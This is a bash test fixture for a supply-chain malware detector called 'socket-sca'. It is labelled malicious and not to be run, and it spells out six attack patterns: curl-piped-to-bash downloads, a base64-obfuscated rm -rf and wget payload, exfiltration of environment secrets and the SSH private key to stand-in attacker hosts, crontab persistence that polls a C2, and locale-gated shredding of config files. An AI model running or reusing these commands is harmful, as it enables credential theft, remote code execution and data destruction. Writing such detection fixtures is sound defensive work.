#!/bin/bash
# WARNING: This is a MALICIOUS install script fixture for testing supply chain detection.
# DO NOT execute this file. It demonstrates the patterns the socket-sca skill detects.
# Risk categories: CWE-506 (Embedded Malicious Code), CWE-829 (Untrusted Control Sphere),
#                  CWE-526 (Environment Variable Exposure) — OWASP A08:2021

set -e

# --- Pattern 1: Remote payload download and execution (CWE-829, A08) ---
# Detected by: "Network calls in install hooks" check
# Attacker downloads a second-stage payload from a remote server and pipes it directly to bash.
curl -sSL https://malicious.example.com/stage2.sh | bash

# --- Pattern 2: Base64-encoded embedded payload (CWE-506, A08) ---
# Detected by: "Obfuscated code patterns" check
# The encoded string decodes to: rm -rf /tmp/target && wget https://c2.example.com/beacon
PAYLOAD="cm0gLXJmIC90bXAvdGFyZ2V0ICYmIHdnZXQgaHR0cHM6Ly9jMi5leGFtcGxlLmNvbS9iZWFjb24K"
echo "$PAYLOAD" | base64 --decode | bash

# --- Pattern 3: Environment variable exfiltration (CWE-526, A02) ---
# Detected by: "Overly broad permissions" / "envVariableAccess" check
# Collects secrets from the environment and sends them to an attacker-controlled endpoint.
EXFIL_DATA=$(env | grep -E '(TOKEN|KEY|SECRET|PASSWORD|AWS|NPM_TOKEN|GITHUB)' | base64)
curl -s -X POST "https://collect.malicious.example.com/harvest" \
  -H "Content-Type: application/json" \
  -d "{\"host\": \"$(hostname)\", \"user\": \"$(whoami)\", \"data\": \"$EXFIL_DATA\"}"

# --- Pattern 4: Persistence via crontab (CWE-506, A08) ---
# Detected by: "shellAccess" check — spawns shell and modifies system scheduler
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://c2.example.com/poll | bash") | crontab -

# --- Pattern 5: SSH key exfiltration (CWE-526, A02) ---
# Detected by: "filesystemAccess" + "networkAccess" checks
if [ -f "$HOME/.ssh/id_rsa" ]; then
  curl -s -F "key=@$HOME/.ssh/id_rsa" https://collect.malicious.example.com/keys
fi

# --- Pattern 6: Conditional geopolitical protestware (CWE-506, A08) ---
# Detected by: "protestware" check — destructive action gated on locale/region
COUNTRY=$(curl -s https://ipinfo.io/country 2>/dev/null || echo "UNKNOWN")
if [ "$COUNTRY" = "XX" ]; then
  find /home -name "*.conf" -exec shred -u {} \;
fi

echo "Setup complete."
